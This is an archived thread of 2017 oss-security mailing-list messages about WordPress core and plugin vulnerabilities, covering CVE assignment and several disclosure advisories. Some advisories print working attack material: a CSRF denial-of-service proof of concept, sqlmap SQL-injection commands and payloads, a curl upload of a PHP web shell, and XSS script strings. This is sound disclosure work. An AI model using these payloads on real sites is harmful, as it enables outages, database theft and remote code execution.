> The CSRF can trigger an outbound HTTP request for a large file that is
then parsed by Press This.
>
> ------------------------------------------
>
> [Vulnerability Type]
> Cross Site Request Forgery (CSRF)
>
> ------------------------------------------
>
> [Affected Product Code Base]
> wordpress - 4.2-4.7.2
>
> ------------------------------------------
>
> [Affected Component]
> Press This module
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Impact Denial of Service]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> Craft a html file on a remote server and get admin to visit it using
Press This module
>
> ------------------------------------------
>
> [Reference]
> https://codex.wordpress.org/Version_4.7.3
>
https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
>
https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829
>
https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
> http://openwall.com/lists/oss-security/2017/03/06/7
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true
>
> ------------------------------------------
>
> [Discoverer]
> Sipke Mellema

Use CVE-2017-6819.


- --
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  http://cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJYxJWeAAoJEHb/MwWLVhi2siMQAKXaKOf5BZpRfjzAX6cg9hr6
NeDP3Pw/LyrWlQNQIX0jg7v0L8WNg1AJ1qU3rnW3y+9Nn9HL2QB6FX5j+TCkmWQQ
9Jufvcl742xqQEGqkROyYjE04uh9WZjp2VOKDJe64edyiJ5hdIO3WH8OrZ5L08WF
jd6YD6jEpuroqyUoY+36un/M8AKP/AFOHOcMknsu4v6WOPCm4D7RX2HifL2pqNar
7k29sxTt727PHlZkDfbs0sOhPy1icrhZ0NzWJ34u42099j6sGUc9Cz/P2OjySYdP
JwB9q2JwWmgbP8HxYNnnFGvdzE6hAZUOvjJiLgU07Y/6T8RrKJpozzzknAZ/fvst
ZM0oCWZxCzleIg0cpk+2FF/l6YJ4scBfITJq/wrpzPbA+UskYk7v2R41T83oli5j
PFqFAZXVg8pOL7VUpwPx6W1dR77HXJe9aOoslgM2SToXBf7amsaJCk3wn0/ysP41
eiNA6x9QHqBQmv4F27GD1F9rX0SYcsnb8L/uUVnnKzTrJiU3wvqeSLeDGhEKi+A7
kzfYX9SVwQod3wKyNg1B+WtlRZc+AV3zg5OThfUIbv+Y6jmowyGUIQXyAkuzsu1b
jmDfdY7X0dD9vaKNOy2W4kBfycRBUH7lB61EIQR3stq1S5v1+GvRLsZh1NBjXQX6
PvQbSfQLSAyPY9xY6/NF
=yD6/
-----END PGP SIGNATURE-----
-- 
Craig Small (@smallsees)   http://dropbear.xyz/     csmall at : enc.com.au
Debian GNU/Linux           http://www.debian.org/   csmall at : debian.org
GPG fingerprint:        5D2F B320 B825 D939 04D2  0519 3938 F96B DF50 FEA5


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] CVE Request: Wordpress: 6 security issues in Wordpress 4.7 2</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Important/cur/1489331719.26232_184.Morbo,U=16606:2,S -->

##### Craig Small <csmall@enc.com.au>, `CALy8Cw6nxZkzoodbfrdWJzj15GtyE8P08cDhP95bzHKGah4spQ@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Hello again,
 Wordpress 4.7.3 fixes 6 security issues.  Summer of Pwnage has reported 2
here yesterday but here is the list from the wordpress site.

Cross-site scripting (XSS) via media file metadata. Reported by Chris Andrè
Dale, Yorick Koster, and Simon P. Briggs.

Control characters can trick redirect URL validation. Reported by Daniel
Chatfield.

Unintended files can be deleted by administrators using the plugin deletion
functionality. Reported by xuliang.

Cross-site scripting (XSS) via video URL in YouTube embeds. Reported by
Marc Montpas.

Cross-site scripting (XSS) via taxonomy term names. Reported by Delta.

Cross-site request forgery (CSRF) in Press This leading to excessive use of
server resources. Reported by Sipke Mellema.


Reference:
https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
-- 
Craig Small (@smallsees)   http://dropbear.xyz/     csmall at : enc.com.au
Debian GNU/Linux           http://www.debian.org/   csmall at : debian.org
GPG fingerprint:        5D2F B320 B825 D939 04D2  0519 3938 F96B DF50 FEA5

```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Important/cur/1489331719.26232_183.Morbo,U=16605:2,S -->

##### Emilio Pozuelo Monfort <pochu27@gmail.com>, `8d300c59-47af-f2ad-2d75-2d38c611491d@gmail.com`

```
On 07/03/17 11:44, Craig Small wrote:
> Hello again,
>  Wordpress 4.7.3 fixes 6 security issues.  Summer of Pwnage has reported 2
> here yesterday but here is the list from the wordpress site.
> 
> Cross-site scripting (XSS) via media file metadata. Reported by Chris Andrè
> Dale, Yorick Koster, and Simon P. Briggs.
> 
> Control characters can trick redirect URL validation. Reported by Daniel
> Chatfield.
> 
> Unintended files can be deleted by administrators using the plugin deletion
> functionality. Reported by xuliang.
> 
> Cross-site scripting (XSS) via video URL in YouTube embeds. Reported by
> Marc Montpas.
> 
> Cross-site scripting (XSS) via taxonomy term names. Reported by Delta.
> 
> Cross-site request forgery (CSRF) in Press This leading to excessive use of
> server resources. Reported by Sipke Mellema.
> 
> 
> Reference:
> https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/

Please report these through http://cveform.mitre.org/ to get CVEs assigned, and
follow up here with the CVE identifiers after that's done.

Thanks,
Emilio

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Important/cur/1489331719.26232_182.Morbo,U=16604:2,S -->

##### Kurt Seifried <kseifried@redhat.com>, `CANO=Ty0eb=oUz+F5o3jxt=RxXD4WSiDJeGm_m3MmUw0sfdzg_g@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
So this CVE request raises a good example:

Wordpress needs CVEs for its security flaws. This is a simple fact.

Now ideally the Wordpress team would become a CVE Numbering Authority (CNA)
and cover it themselves, if they would like to do this then they need to
reach out to me as the DWF guy and I can make that happen.

If that doesn't happen then the good news is we have another option now.
Someone can become a CVEMentor and CNA and take over the Wordpress
assignments (well until Wordpress becomes a CNA). So if someone wants to
step up and do this, please contact me as the DWF guy and I can make that
happen.

This is also true for other projects/open source products. We need better
CVE coverage. Ideally these projects/products step up and become CNA's, but
if they cannot (lack of resources/time/etc) that's ok, because now people
with an interest can come forwards and do it.

On Tue, Mar 7, 2017 at 4:16 AM, Emilio Pozuelo Monfort <pochu27@gmail.com>
wrote:

> On 07/03/17 11:44, Craig Small wrote:
> > Hello again,
> >  Wordpress 4.7.3 fixes 6 security issues.  Summer of Pwnage has reported
> 2
> > here yesterday but here is the list from the wordpress site.
> >
> > Cross-site scripting (XSS) via media file metadata. Reported by Chris
> Andrè
> > Dale, Yorick Koster, and Simon P. Briggs.
> >
> > Control characters can trick redirect URL validation. Reported by Daniel
> > Chatfield.
> >
> > Unintended files can be deleted by administrators using the plugin
> deletion
> > functionality. Reported by xuliang.
> >
> > Cross-site scripting (XSS) via video URL in YouTube embeds. Reported by
> > Marc Montpas.
> >
> > Cross-site scripting (XSS) via taxonomy term names. Reported by Delta.
> >
> > Cross-site request forgery (CSRF) in Press This leading to excessive use
> of
> > server resources. Reported by Sipke Mellema.
> >
> >
> > Reference:
> > https://wordpress.org/news/2017/03/wordpress-4-7-3-
> security-and-maintenance-release/
>
> Please report these through http://cveform.mitre.org/ to get CVEs
> assigned, and
> follow up here with the CVE identifiers after that's done.
>
> Thanks,
> Emilio
>



-- 

Kurt Seifried -- Red Hat -- Product Security -- Cloud
PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
Red Hat Product Security contact: secalert@redhat.com

```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489331687.26232_49.Morbo,U=40924:2,T -->

##### Craig Small <csmall@debian.org>, `CALy8Cw6aiwPBKyW_ObB8OmBdxwWm5ypFUVCg6hbbJGE4oBuczw@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Hi Kurt,
  As someone who seems to ask about the CVEs for wordpress the most I'll
put my hand up to raise the CVEs for wordpress. I am only the Debian
packager for wordpress so if the wordpress project itself wants to raise
these CVEs then I'm all for handing it over to them.

Annoyingly, the mitre website breaks if you enter more than 2 requests in
(or it doesn't like something I typed). Something deep in
ScriptResource.axd gives a 500 error, so it will take a while to key all 6
in. This also explains why all 6 were not entered in one go.

 - Craig

>
> --
Craig Small (@smallsees)   http://dropbear.xyz/     csmall at : enc.com.au
Debian GNU/Linux           http://www.debian.org/   csmall at : debian.org
GPG fingerprint:        5D2F B320 B825 D939 04D2  0519 3938 F96B DF50 FEA5


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489088167.6202_24.Morbo,U=40473:2, -->

##### "Larry W. Cashdollar" <larry0@me.com>, `C3D0A2F5-941D-4030-9910-57C3E46053E1@me.com`

```
Title: Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5
Author: Larry W. Cashdollar, @_larry0
Date: 2017-03-08
CVE-IDs: CVE-2017-1002004 CVE-2017-1002005
Download Site: https://wordpress.org/plugins/dtracker/
Vendor: https://profiles.wordpress.org/dijo/
Vendor Notified: 2017-03-08
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=183
Description: Track the details of the users downloading the pdf files from wordpress site.
Vulnerability:
CVE-2017-1002004:
In file ./dtracker/download.php user input isn't sanitized via the id variable before adding it to the end of an SQL query.

$doc_id         = $_GET['id'];
$file = $wpdb->get_results( "SELECT * FROM wp_posts WHERE ID = $doc_id " );

The user does not need to be authenticated to the Wordpress installation to exploit this vulnerability.

CVE-2017-1002005:
In file ./dtracker/delete.php user input isn't sanitized via the contact_id variable before adding it to the end of an SQL query.

$contact_id     = $_POST['contact_id']; //Contact ID to be deleted

$query  = "DELETE FROM wp_contacts WHERE id = $contact_id";
$wpdb->query($query); // Delete the contact

The user does not need to be authenticated to the Wordpress installation to exploit this vulnerability.

Exploit Code:
	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtracker/download.php?id=*'  --dbms mysql  --level 3 --risk 3
	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
	• sqlmap identified the following injection point(s) with a total of 1410 HTTP(s) requests:
	• ---
	• Parameter: #1* (URI)
	•     Type: AND/OR time-based blind
	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
	•     Payload: http://192.168.0.169:80/wordpress/wp-content/plugins/dtracker/download.php?id=(CASE WHEN (7148=7148) THEN SLEEP(5) ELSE 7148 END)
	• ---
	• [10:14:09] [INFO] the back-end DBMS is MySQL
	• web server operating system: Linux Ubuntu 16.04 (xenial)
	• web application technology: Apache 2.4.18
	• back-end DBMS: MySQL >= 5.0.12
	• [10:14:09] [WARNING] HTTP error codes detected during run:
	• 404 (Not Found) - 14 times
	• [10:14:09] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
	


	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtracker/delete.php' --data 'contact_id=*'  --dbms mysql --risk 1 --level 3
	•  
	• (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
	• sqlmap identified the following injection point(s) with a total of 831 HTTP(s) requests:
	• ---
	• Parameter: #1* ((custom) POST)
	•     Type: AND/OR time-based blind
	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
	•     Payload: contact_id=(SELECT * FROM (SELECT(SLEEP(5)))Vtrh)
	• ---
	• [11:53:27] [INFO] the back-end DBMS is MySQL
	• web server operating system: Linux Ubuntu 16.04 (xenial)
	• web application technology: Apache 2.4.18
	• back-end DBMS: MySQL >= 5.0.12
	• [11:53:27] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
```

</details>
<details>
<summary><strong>[oss-security] WordPress audio playlist functionality is affected by Cross-Site Scripting</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488841538.28350_1.Morbo,U=39865:2, -->

##### Summer of Pwnage <lists@securify.nl>, `6ce499a4-c9bb-ad62-aa85-4a67f77b2a19@securify.nl`

```
------------------------------------------------------------------------
WordPress audio playlist functionality is affected by Cross-Site
Scripting
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
Two Cross-Site Scripting vulnerabilities exists in the playlist
functionality of WordPress. These issues can be exploited by convincing
an Editor or Administrator into uploading a malicious MP3 file. Once
uploaded the issues can be triggered by a Contributor or higher using
the playlist shortcode.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160717-0003

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on the WordPress [2] version 4.5.3.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
These issues are resolved in WordPress version 4.7.3. [3]

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
WordPress is web software you can use to create a website, blog, or
app. Two Cross-Site Scripting vulnerabilities exists in the playlist
functionality of WordPress. These issues can be exploited by convincing
an Editor or Administrator into uploading a malicious MP3 file. Once
uploaded the issues can be triggered by a Contributor or higher using
the playlist shortcode.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
It was discovered that meta information (ID3) stored in audio files are
not properly sanitized in case they are uploaded by a user with the
unfiltered_html (generally an Editor or Administrator).

The first Cross-Site Scripting vulnerability exists in the function that
processes the playlist shortcode, which is done in the
wp_playlist_shortcode() method (/wp-includes/media.php). This method
creates a <noscript> block for users with JavaScript disabled.

https://www.securify.nl/advisory/SFY20160742/noscript_unfiltered_html.png

The method wp_get_attachment_link() does not perform any output encoding
on the link text. Meta information from the audio file is used in the
link text, rendering wp_playlist_shortcode() vulnerable to Cross-Site
Scripting.

The second Cross-Site Scripting issue is DOM-based and exists in the
JavaScript file /wp-includes/js/mediaelement/wp-playlist.js (or
/wp-includes/js/mediaelement/wp-playlist.min.js). The WPPlaylistView
object is used to render a audio player client side. The method
renderTracks() uses the meta information from the audio file in a call
to jQuery's append() method. No output encoding is used on the meta
information, resulting in a Cross-Site Scripting vulnerability.

https://www.securify.nl/advisory/SFY20160742/renderTracks-dom-based_xss.png

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
The following MP3 file can be used to reproduce this issue:

https://www.securify.nl/advisory/SFY20160742/xss.mp3

1) upload MP3 file to the Media Library (as Editor or Administrator).
2) Insert an Audio Playlist in a Post containing this MP3 (Create Audio
Playlist).
------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] 
https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
[2] https://wordpress.org/
[3] 
https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/

```

</details>
<details>
<summary><strong>[oss-security] Cross-Site Request Forgery in WordPress Press This function allows DoS</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488841416.28163_1.Morbo,U=39861:2, -->

##### Summer of Pwnage <lists@securify.nl>, `2de68dc9-33ed-3cfc-a621-f958625a2a6b@securify.nl`

```
------------------------------------------------------------------------
Cross-Site Request Forgery in WordPress Press This function allows DoS
------------------------------------------------------------------------
Sipke Mellema, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Request Forgery (CSRF) vulnerability exists on the Press
This page of WordPress. This issue can be used to create a Denial of
Service (DoS) condition  if an authenticated administrator visits a
malicious URL.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160718-0005

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on WordPress [2] version 4.5.3.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is resolved in WordPress version 4.7.3. [3]

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
WordPress is web software you can use to create a website, blog, or
app. A Cross-Site Request Forgery (CSRF) vulnerability exists on the
Press This page of WordPress. This issue can be used to create a Denial
of Service (DoS) condition of an affected WordPress site.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
WordPress' Press This [4] function allows quick publishing with a
special web browser bookmarklet. An admin can also visit the Press This
page directly. One of the features of Press This is scanning an external
server for embeddable content. This is done with a GET request to:
/wp-admin/press-this.php?u=<URL>&url-scan-submit=Scan

When this URL is called, Press This will download the page located at
"URL" and look for content such as images and other embeddable elements.
No maximum is set for the amount of data Press This can retrieve when
scanning. This behavior can be abused by setting the external URL to a
huge file and have an authenticated admin visit it. The PHP process will
use 100% of its CPU resources to process the file. If an authenticated
admin can be lured to an external page, then the malicious URL can be
called many times, blocking all PHP server threads. This will cause the
server to be unreachable for a while.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
On an external server, create a large text file with the command:
perl -e 'print "<>"x28000000' > foo.txt

Next, create a file called dos.html on the external server with enough
entries to fill the connection pool of the WordPress server, as follows:
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=e'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=f'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=g'>
[..]
(replace <wp server> with the WordPress server address and <external
server> with the external server)

Now have a logged in admin visit dos.html. The server will be down for a
while.
------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] 
https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
[2] https://wordpress.org/
[3] 
https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
[5] https://codex.wordpress.org/Press_This

```

</details>
<details>
<summary><strong>[oss-security] Remote file upload vulnerabilities in multiple wordpress plugins</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488821626.18386_1.Morbo,U=39796:2, -->

##### "Larry W. Cashdollar" <larry0@me.com>, `4EBCE262-F53E-4DAC-90E4-913D8E81C063@me.com`

```

Hello,

All of these plugins include unlicensed software developed by http://www.invedion.com/ that is vulnerable, I am unable to get 
more details from the vendor as to what the software name and version are and therefor can't issue a CVE for just
that software.  I've issued CVEs for the impacted plugins I know of:

CVE-2017-1002000
Remote file upload vulnerability in Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0
Example: http://example.com/wordpress/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/server/images.php
http://www.vapidlabs.com/advisory.php?v=179

CVE-2017-1002001
Remote file upload vulnerability in Wordpress Plugin mobile-app-builder-by-appress v1.05
Example: http://example.com/wordpress/wp-content/plugins/mobile-app-builder-by-wappress/server/images.php
http://www.vapidlabs.com/advisory.php?v=180

CVE-2017-1002002
Remote file upload vulnerability in Wordpress Plugin webapp-builder v2.0
Example: http://example.com/wordpress/wp-content/plugins/webapp-builder/server/images.php
http://www.vapidlabs.com/advisory.php?v=181


CVE-2017-1002003
Remote file upload vulnerability in Wordpress Plugin wp2android-turn-wp-site-into-android-app v1.1.4
Example: http://example.com/wordpress/wp-content/plugins/wp2android-turn-wp-site-into-android-app/server/images.php
http://www.vapidlabs.com/advisory.php?v=182

@muntopia provided an exploit for all of them here:
https://github.com/alienwithin/Scripts-Sploits/blob/master/zen_app_mobile_wp_rfu.py
```

</details>
<details>
<summary><strong>[oss-security] Remote file upload vulnerability in Wordpress Plugin Mobile App Native 3.0</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549991.3737_41.Morbo,U=38525:2,S -->

##### "Larry W. Cashdollar" <larry0@me.com>, `798D4367-AFCB-43FF-A603-F296E7E38ECE@me.com`

```
Title: Remote file upload vulnerability in Wordpress Plugin Mobile App Native 3.0
Author: Larry W. Cashdollar, @_larry0
Date: 2017-02-27
Download Site: https://wordpress.org/plugins/zen-mobile-app-native/
Vendor: https://profiles.wordpress.org/zendkmobileapp/
Vendor Notified: 2017-02-27
Vendor Contact:
Description: Mobile App WordPress plugin lets you turn your website into a full-featured mobile application in minutes using Mobile App Builder.
Vulnerability:
The code in file ./zen-mobile-app-native/server/images.php doesn't require authentication or check that the user is allowed to upload content.
It also doesn't sanitize the file upload against executable code.

<?php
//header('content-type: text/html; charset=iso-8859-2');
header('Content-Type: text/html; charset=utf-8');
header('Access-Control-Allow-Origin: *');
require_once('function.php');

if ($_FILES['file']['name']) {
if (!$_FILES['file']['error']) {
$name = md5(rand(100, 200));
$ext = explode('.', $_FILES['file']['name']);
$filename = $name . '.' . $ext[1];
$destination = 'images/' . $filename;
$location = $_FILES["file"]["tmp_name"];
move_uploaded_file($location, $destination);
echo $plugin_url.'/server/images/' . $filename;
}
else {
echo $message = 'Ooops! Your upload triggered the following error: '.$_FILES['file']['error'];
}
}
CVE-ID: CVE-2017-6104
Exploit Code:
$ curl -F "file=@/var/www/shell.php" "http://example.com/wordpress/wp-content/plugins/zen-mobile-app-native/server/images.php"
http://example.com/wordpress/wp-content/plugins/zen-mobile-app-native//server/images/8d5e957f297893487bd98fa830fa6413.php
Advisory: http://www.vapidlabs.com/advisory.php?v=178
```

</details>
<details>
<summary><strong>[oss-security] Persistent XSS Vulnerability in Wordpress plugin AnyVar v0.1.1</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379271.2379_91.Morbo,U=38115:2,S -->

##### "Larry W. Cashdollar" <larry0@me.com>, `2DC459E9-2A8F-45E1-8D1C-7AC78F3BCADB@me.com`

```
Title: Persistent XSS Vulnerability in Wordpress plugin AnyVar v0.1.1
Author: Larry W. Cashdollar, @_larry0
Date: 2017-02-21
Download Site: https://wordpress.org/plugins/anyvar
Vendor: https://profiles.wordpress.org/matt_dev/
Vendor Notified: 2017-02-28
Vendor Contact: plugins@wordpress.org
Description: AnyVar is a simple search and replace plugin. It lets you add changeable variables (text snippets) to posts, sidebars, widgets, links & themes.
Vulnerability:
$var_name and $var_text aren't sanitized before being sent to the webpage.  $var_name only can contain text so only $var_text is exploitable
In file ./anyvar/anyvar.php:

202                         echo "<tr id='anyvar-$var_name' $class>
203                                 <th scope='row' class='check-column'><input     type='checkbox' name='delete[]' value='$var_name' /></th>
204                                 <td><a class='row-title' href='?page=".$_GET    ['page']."&action=edit&amp;var=$var_name' title='Edit &quot;$var_name&quot;'    > $var_name</a></td>
205                                 <td>[$var_name]</td>
206                                 <td><textarea name='anyvar_text_$var_name' i    d='anyvar_text_$var_name' cols='60' rows='3' readonly>$var_text</textarea></    td>

CVE-ID: CVE-2017-6103
Exploit Code:
	• In the text field box the following will trigger a JS alert popup:
	•  
	• </textarea><script>alert(1);</script><textarea>
Screen Shots: [http://www.vapidlabs.com/m/xssvar.png]
Advisory: http://www.vapidlabs.com/advisory.php?v=177
```

</details>
<details>
<summary><strong>[oss-security] Persistent XSS in wordpress plugin rockhoist-badges v1.2.2</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379271.2379_90.Morbo,U=38114:2, -->

##### "Larry W. Cashdollar" <larry0@me.com>, `4B868989-042B-4372-B240-CA7A707CA929@me.com`

```
Title: Persistent XSS in wordpress plugin rockhoist-badges v1.2.2
Author: Larry W. Cashdollar, @_larry0
Date: 2017-02-20
Download Site: https://wordpress.org/plugins/rockhoist-badges/
Vendor: https://profiles.wordpress.org/esserq/
Vendor Notified: 2017-02-20
Vendor Contact:
Description: A Stack Overflow inspired plugin for WordPress which allows users to acquire badges for contributing website content. Badges are created and managed through the WordPress Dashboard.
Vulnerability:
There is a persistent cross site scripting vulnerability in the plugin Rockhoist Badges.  A user with the 
ability to edit_posts can inject malicious javascript.  Into the badge description or title field.

Line 603 doesn't sanitize user input before sending it to the browser in file ./rockhoist-badges/rh-badges.php:

-> 603: <span class="delete"><a href="?page=badges&action=deletecondition&badge_ID=<?php echo $_GET['badge_ID']; ?>&badge_condition_ID=<?php echo $badge_condition->badge_condition_id; ?>" class="delete-tag">Delete</a></span>

CVE-ID: CVE-2017-6102
Exploit Code:
	• "><script>alert(1);</script> in the title or description field will inject js.
Screen Shots: [http://www.vapidlabs.com/m/badges.jpg]
Advisory: http://www.vapidlabs.com/advisory.php?v=176
```

</details>
<details>
<summary><strong>[oss-security] Multiple vulnerabilities affecting various WordPress Plugins</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379271.2379_84.Morbo,U=38110:2,T -->

##### Summer of Pwnage <lists@securify.nl>, `32f3823a-56ce-f384-03dc-7c813169cf38@securify.nl`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Please see attached advisories for more information. These issues were 
found during Summer of Pwnage (https://sumofpwn.nl), a Dutch community 
project. Its goal is to contribute to the security of popular, widely 
used OSS projects in a fun and educational way.





```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Analytics Stats Counter Statistics WordPress Plugin unauthenticated PHP
Object injection vulnerability
------------------------------------------------------------------------
Yorick Koster, June 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A PHP Object injection vulnerability was found in the Analytics Stats
Counter Statistics WordPress Plugin, which can be used by an
unauthenticated user to instantiate arbitrary PHP Objects. Using this
vulnerability it is possible to execute arbitrary PHP code.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160803-0005

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on the Analytics Stats Counter
Statistics [2] WordPress Plugin version 1.2.2.5.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The Analytics Stats Counter Statistics [2] WordPress Plugin analyses
visitors statistics on a WordPress site. A PHP Object injection [3]
vulnerability was found in the Analytics Stats Counter Statistics
WordPress Plugin, which can be used by an unauthenticated user to
instantiate arbitrary PHP Objects.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
This issue is possible due to an unsafe call to unserialize() in the
wpadm_unpack() method. The input is taken directly from the POST request
as can be seen in the following code fragment:

wpadm.php:

if ( ! function_exists( 'wpadm_run' )) {
	function  wpadm_run($pl, $dir) {
		@set_time_limit(0);
		require_once dirname(__FILE__) . '/class-wpadm-method-class.php';
		$request_name = 'wpadm_'.$pl.'_request';
		if( isset( $_POST[$request_name] ) && ! empty ( $_POST[$request_name]
) ) {
			require_once dirname(__FILE__) . '/class-wpadm-core.php';
			$wpadm = new WPAdm_Core(wpadm_unpack($_POST[$request_name]), $pl,
$dir);
			echo '<wpadm>'.wpadm_pack($wpadm->getResult()->toArray()).'</wpadm>';
			exit;
		}
	}
}
	
	
if ( ! function_exists( 'wpadm_unpack' )) {
	/**
	 * @param str $str
	 * @return mixed
	 */
	function wpadm_unpack( $str ) {
		return unserialize( base64_decode( $str ) );
	}
}

It has been confirmed that this issues can be used to execute arbitrary
PHP code.

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/analytics_stats_counter_statistics_wordpress_plugin_unauthenticated_php_object_injection_vulnerability.html
[2] https://wordpress.org/plugins/stats-counter/
[3] https://www.owasp.org/index.php/PHP_Object_Injection
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Simple Ads Manager WordPress plugin unauthenticated PHP Object injection
vulnerability
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A PHP Object injection vulnerability was found in the Simple Ads Manager
WordPress plugin. The unauthenticated PHP Object injection vulnerability
can be used by an unautenthicated user to instantiate arbitrary PHP
Objects. This issue can potentially result in arbitrary code execution,
but this has not been confirmed.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0041

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was succesfully tested on the Simple Ads Manager [2]
WordPress plugin version 2.9.8.125.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The Simple Ads Manager [2] WordPress Plugin is an easy to use plugin
providing a flexible logic of displaying advertisements. A PHP Object
injection [3] vulnerability was found in Simple Ads Manager WordPress
plugin. The unauthenticated PHP Object injection vulnerability can be
used by an unautenthicated  user to instantiate arbitrary PHP Objects.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
This issue is possible due to two unsafe calls to unserialize() in the
sam-ajax-loader.php file. The input is taken directly from the POST
request as can be seen in the following code fragment:

sam-ajax-loader.php:

if ( in_array( $action, $allowed_actions ) ) {
	switch ( $action ) {
		case 'sam_ajax_load_place':
			echo json_encode( array( 'success' => false, 'error' =>
'Deprecated...' ) );
			break;
	
		case 'sam_ajax_load_ads':
			if ( ( isset( $_POST['ads'] ) && is_array( $_POST['ads'] ) ) &&
